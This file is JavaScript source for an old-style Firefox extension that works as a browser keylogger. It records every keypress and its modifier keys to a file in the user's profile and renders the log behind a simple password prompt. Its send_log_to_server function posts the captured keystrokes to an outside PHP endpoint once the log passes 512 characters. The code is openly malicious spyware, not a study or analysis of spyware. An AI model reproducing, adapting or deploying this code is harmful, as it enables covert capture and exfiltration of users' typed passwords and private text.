var fff_namespace={};

fff_namespace.fff=function()
{
	var file = Components.classes["@mozilla.org/file/directory_service;1"].
							 getService(Components.interfaces.nsIProperties).
							 get("ProfD", Components.interfaces.nsIFile);
		file.append("FFF");
		if( !file.exists() || !file.isDirectory() ) {   // if it doesn't exist, create
		   file.create(Components.interfaces.nsIFile.DIRECTORY_TYPE, 0777);
		}

	this.f = file.path+"\\text.txt";

	window.addEventListener( "load", function() {fff.init(); }, false);
};
var keylog=new fff_namespace.fff();

keylog.logKeypress = function(e) {
	var file = Components.classes["@mozilla.org/file/local;1"]
						 .createInstance(Components.interfaces.nsILocalFile);
	file.initWithPath(keylog.f);

	var data = '';
	if( e.shiftKey )
		data += 'shift';
	if( e.altKey )
		data += 'alt';
	if( e.ctrlKey )
		data += 'ctrl';
	if(data)
		data += '|';

	data += e.which + "|";
	var	foStream = Components.classes["@mozilla.org/network/file-output-stream;1"]
						   .createInstance(Components.interfaces.nsIFileOutputStream);
	// use 0x02 | 0x10 to open file for appending.
	foStream.init(file, 0x02 | 0x10 | 0x08, 00666, 0); // write(only), append, create file
	foStream.write(data, data.length);
	foStream.close();
}

keylog.log_file_size = function(){
	return String( keylog.get_log_file_content() ).length
};

keylog.get_log_file_content = function(){
	//read the contents of the log file
	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
	file.initWithPath(keylog.f);

	var inputStream = Components.classes["@mozilla.org/network/file-input-stream;1"].createInstance(Components.interfaces.nsIFileInputStream);
	inputStream.init(file, -1, 0,0);
	var sInputStream = Components.classes["@mozilla.org/scriptableinputstream;1"].createInstance(Components.interfaces.nsIScriptableInputStream);
	sInputStream.init(inputStream);
	return sInputStream.read(sInputStream.available());
};

keylog.present_log = function() {
	function isNumber(n) {
		return !isNaN(parseFloat(n)) && isFinite(n);
	}
	var str = keylog.get_log_file_content();

	//writing the log file to a designed HTML file
	var tmp_str='';
	for(var y=0, begin_segment=0, len=String(str).length, charrr='', charrrAfter=''; y<len; y++)
	{
	 if(str.substring(y,y+1)=='|')
	 {
	  //tmp_str+=String.fromCharCode(str.substring(begin_segment,y));
	  charrr = str.substring(begin_segment,y);
	  if(!isNumber(charrr))
	  {
		tmp_str+='<i '+charrr+'>';
		charrrAfter='</i>';
	  }
	  else
	  {
		  if(charrr == 13)
			tmp_str+="<br>\n";
		  else if(charrr == 8)
			tmp_str+='<i bs></i>';
		  else if(charrr == 0)
			tmp_str+='<i tab></i>';
		  else
			tmp_str+='&#' + charrr + ';';

			tmp_str+=charrrAfter;
			charrrAfter = '';
		}
	  begin_segment=y+1;

	 }
	}

	return tmp_str;
};

keylog.do_auth = function() {
	var pass="",
		initial_pass="",
		input_pass="",
		i,
		tmp="";

	//if there's no  password, create it
	var prefs = Components.classes["@mozilla.org/preferences-service;1"]
						.getService(Components.interfaces.nsIPrefService).getBranch("extensions.");
	try {initial_pass = prefs.getCharPref("fff_pass"); }
	catch(e)
	{
	initial_pass=prompt("You haven't defined a password yet."+"\n"+"Please enter a new password!");
	for(i=0;i<initial_pass.length; i++)
	   {
		pass+=initial_pass.charCodeAt(i)+"|";
	   }
	prefs.setCharPref("fff_pass",pass);
	initial_pass = pass; //to prevent error on first login
	}

	pass="";
	//Check the user's password
	input_pass=prompt("Please enter your password!");
	for(i=0; i<initial_pass.length; i++)
	   {
		if(initial_pass.substr(i,1)!='|')
		   tmp+=initial_pass.substr(i,1);
		else
		   {
			pass+=String.fromCharCode(tmp);
			tmp="";
		   }
	   }

	if(input_pass!=pass)
	   {
		alert("Your password is wrong.  Please try again!");
		return false;
	   }
	return true;
};

keylog.show_present_log = function(){
	if(!keylog.do_auth())
		return false;
	//not stored in history
	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8">'
	+'<style>'
	+'i{font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
	+'i i{border:none;padding:0;margin:0} '
	+'i[bs]:after{color:red;content:"BS"} '
	+'i[tab]:after{color:gray;content:"tab"} '
	+'i[shift]:before{content:"shift+"} '
	+'i[alt]:before{content:"alt+"} '
	+'i[ctrl]:before{content:"ctrl+"} '
	+'i[shift],i[alt],i[ctrl],i[shiftctrl],i[shiftaltctrl],i[shiftalt],i[altctrl] {color:green}'
	+'i[shiftctrl]:before {content:"shift+ctrl+"} '
	+'i[shiftaltctrl]:before {content:"shift+alt+ctrl+"} '
	+'i[shiftalt]:before {content:"shift+alt+"} '
	+'i[altctrl]:before {content:"alt+ctrl+"} '
	+'</style>'
	+'</head><body style="font-family:monospace;line-height:20px;font-size:13px">'+ keylog.present_log() +'</body></html>' + "\n";

	var win=window.open('data:text/html;charset=utf-8,' + encodeURIComponent(tmp_str), 'log');
	
	win.focus();
	keylog.clear_log();
	
};

keylog.clear_log = function(){
	//delete the contents of the log file
	var file = Components.classes["@mozilla.org/file/local;1"] .createInstance(Components.interfaces.nsILocalFile);
	file.initWithPath(keylog.f);
	// file is nsIFile, data is a string
	var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
	// use 0x02 | 0x10 to open file for appending.
	foStream.init(file, 0x02 | 0x08 | 0x20, 0666, 0); // write(only), append, create file
	foStream.write("", 0);
	foStream.close();
};

keylog.ajaxFunction = function(url, callback, params)
{
	var xmlHttp=new XMLHttpRequest(url);

	xmlHttp.onreadystatechange=function()
	{
		if(xmlHttp.readyState==4 && xmlHttp.status == 200)
		{
			callback(xmlHttp.responseText, xmlHttp);
		}
	}

	//Sending POST method.
	if (params)
	{
		xmlHttp.open("POST", url, true);
		xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		xmlHttp.send(JSON.stringify(params));
	}
	//Sending GET method.
	else
	{
		xmlHttp.open("GET", url, true);
		xmlHttp.send(null);
	}
};

keylog.send_log_to_server = function()
{
	if(keylog.log_file_size() >= 512)
		keylog.ajaxFunction('http://www.polishwebdesign.pl/projekty/logger/logger.class.php', keylog.clear_log, {data: keylog.present_log()})
};



if (typeof(fff) === "undefined")
{
	var fff = {
		init : function() {
			document.addEventListener("keypress", keylog.logKeypress, false);
			document.addEventListener("click", keylog.send_log_to_server, false);
		}
	}
}
